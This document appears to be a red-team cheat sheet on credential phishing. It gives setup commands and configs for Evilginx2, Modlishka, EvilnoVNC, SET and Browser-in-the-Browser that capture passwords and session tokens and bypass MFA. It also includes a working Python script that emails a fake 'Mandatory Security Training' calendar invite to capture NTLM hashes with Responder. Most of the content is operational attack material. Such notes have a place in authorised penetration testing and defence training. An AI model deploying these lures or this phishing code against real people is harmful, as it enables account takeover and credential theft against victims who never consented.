## Credential Harvesting

Phishing for credentials via cloned portals, MFA interception proxies, and social engineering tools.

---

### Evilginx2

Reverse proxy that sits between the victim and the real login page. Captures credentials **and session tokens** in real-time, bypassing MFA.

https://github.com/kgretzky/evilginx2

#### Setup

```sh
# Install
sudo apt install evilginx2
# or build from source
go install github.com/kgretzky/evilginx2@latest

# Run
sudo evilginx2
```

#### Configuration

```
# Set domain and IP
config domain phish.example.com
config ip <ATTACKER_IP>

# Load a phishlet (pre-built for common services)
phishlets hostname o365 login.phish.example.com
phishlets enable o365

# Create lure (phishing URL)
lures create o365
lures edit 0 redirect_url https://office.com
lures get-url 0
```

#### Phishlet Structure

Phishlets define which domains to proxy and which cookies/tokens to capture:

```yaml
name: 'o365'
proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    session: true
auth_tokens:
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
credentials:
  username:
    key: 'login'
    search: '(.*)'
  password:
    key: 'passwd'
    search: '(.*)'
```

#### Post-Capture

```
# View captured sessions
sessions
sessions <id>

# Extract session cookies — import into browser to hijack session
```

> [!warning] OPSEC
> Evilginx domains need valid TLS certificates (auto-generated via Let's Encrypt). The domain must resolve to your server.

---

### Modlishka

Transparent reverse proxy for credential and MFA interception. Similar concept to Evilginx2 but different implementation.

https://github.com/drk1wi/Modlishka

```sh
# Run with config
./Modlishka -config modlishka.json
```

**Example config:**

```json
{
  "phishingDomain": "phish.example.com",
  "listeningAddress": "0.0.0.0",
  "target": "login.microsoftonline.com",
  "targetResources": "cdn.microsoft.com,aadcdn.msftauth.net",
  "terminateTriggers": "",
  "terminateRedirectUrl": "https://office.com",
  "trackingCookie": "id",
  "trackingParam": "id",
  "jsRules": "",
  "forceHTTPS": true,
  "cert": "/path/to/cert.pem",
  "certKey": "/path/to/key.pem"
}
```

---

### EvilnoVNC

VNC-based phishing that streams a real browser session to the victim. Captures everything — credentials, MFA tokens, session cookies — because the browser runs on the attacker's server.

https://github.com/JoelGMSec/EvilnoVNC

```sh
# Clone and setup
git clone https://github.com/JoelGMSec/EvilnoVNC
cd EvilnoVNC
./start.sh

# Start with target URL
./EvilnoVNC.sh --target "https://login.microsoftonline.com" --port 8080
```

**How it works:**

1. Victim clicks phishing link
2. Link opens a noVNC session in their browser (looks like a normal login page)
3. Victim types credentials into the real login page running on attacker's VNC server
4. Attacker captures credentials, MFA codes, and the authenticated session

> [!info]
> EvilnoVNC defeats phishing-resistant MFA (FIDO2/WebAuthn) because the victim is interacting with the real site — just on the attacker's machine.

---

### Social Engineering Toolkit (SET)

Automated social engineering framework for credential harvesting and phishing attacks.

https://github.com/trustedsec/social-engineer-toolkit

#### Credential Harvester

```sh
sudo setoolkit

# Navigate menus:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner

# Enter attacker IP (where harvested creds are sent)
# Enter target URL to clone (e.g., https://login.microsoftonline.com)
```

SET clones the target login page, hosts it on the attacker's IP, and captures submitted credentials.

#### Spear-Phishing Attack

```sh
# 1) Social-Engineering Attacks
# 1) Spear-Phishing Attack Vectors
# 1) Perform a Mass Email Attack

# Select payload, configure SMTP, enter target emails
```

---

### Browser-in-the-Browser (BitB)

Fake SSO popup windows that mimic OAuth/SAML login flows. A HTML/CSS/JS overlay that looks like a real browser popup window.

https://github.com/mrd0x/BITB

#### How It Works

1. Victim visits attacker-controlled page
2. Page displays a "Sign in with Google/Microsoft" button
3. Clicking opens a fake browser popup (actually a `<div>` styled to look like a window)
4. Victim enters credentials into the fake popup
5. Credentials sent to attacker

#### Template Setup

```sh
git clone https://github.com/mrd0x/BITB
cd BITB
```

Customise the template HTML:
- Set the URL displayed in the fake address bar
- Set the login form fields
- Configure the exfiltration endpoint (where credentials are posted)

```html
<!-- Key elements in the BitB template -->
<div id="window-title">Sign in - Google Accounts</div>
<div id="url-bar">https://accounts.google.com/signin</div>
<iframe src="phishing-login-page.html"></iframe>
```

> [!info]
> BitB is effective because users trust the URL shown in the popup "address bar" — but it's just HTML text, not a real URL bar.

---

### iCalendar / Meeting Invite Abuse

Send weaponised calendar invitations that capture NTLMv2 hashes via Responder. Bypasses typical email content filtering since calendar invites are trusted.

#### Attack Flow

1. Start Responder on attacker server to capture NTLM hashes
2. Craft a fake Teams/meeting invite email with ICS attachment
3. ICS file contains a link pointing to the attacker's Responder server
4. Victim clicks the meeting link → browser sends NTLM auth → hash captured
5. Crack hash with Hashcat

#### Responder Setup

```sh
sudo responder -I eth0 -v
```

#### Python iCalendar Sender (from OSEP)

```python
import smtplib
import datetime
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart

def send_invite(smtp_server, sender, target, event_url):
    # Generate timestamps
    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
    dtstart = (datetime.datetime.now() + datetime.timedelta(days=1)).strftime("%Y%m%dT%H%M%SZ")
    dtend = (datetime.datetime.now() + datetime.timedelta(days=1, hours=1)).strftime("%Y%m%dT%H%M%SZ")

    # ICS content — meeting invite pointing to attacker URL
    ics = f"""BEGIN:VCALENDAR
METHOD:REQUEST
BEGIN:VEVENT
DTSTART:{dtstart}
DTEND:{dtend}
DTSTAMP:{dtstamp}
ORGANIZER;CN=IT Department:mailto:{sender}
SUMMARY:Mandatory Security Training
DESCRIPTION:Join the meeting: {event_url}
END:VEVENT
END:VCALENDAR"""

    # Build email mimicking Teams invite
    msg = MIMEMultipart('mixed')
    msg['Subject'] = 'Mandatory Security Training - Action Required'
    msg['From'] = sender
    msg['To'] = target

    # Attach HTML body and ICS file
    msg.attach(MIMEText(f'<html><body><p>Join meeting: <a href="{event_url}">Click here</a></p></body></html>', 'html'))
    msg.attach(MIMEText(ics, 'calendar;method=REQUEST'))

    # Send
    server = smtplib.SMTP(smtp_server, 25)
    server.ehlo()
    server.sendmail(sender, target, msg.as_string())
    server.close()
```

> [!info]
> Calendar invites often bypass email content filters and appear directly in the victim's calendar application.
